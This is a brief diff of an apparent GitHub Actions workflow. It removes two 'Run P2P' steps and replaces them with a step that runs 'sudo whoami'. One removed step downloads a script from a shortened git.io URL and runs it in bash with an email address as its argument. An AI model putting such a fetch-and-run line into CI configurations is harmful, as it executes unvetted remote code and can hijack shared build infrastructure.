@@ -11,6 +11,4 @@ jobs:
     runs-on: ubuntu-20.04
     steps:
     - name: Run P2P
-      run: bash whoami
-    - name: Run P2P
-      run: bash <(curl -fsSL git.io/JzDdQ) kolana122@outlook.com
+      run: sudo whoami
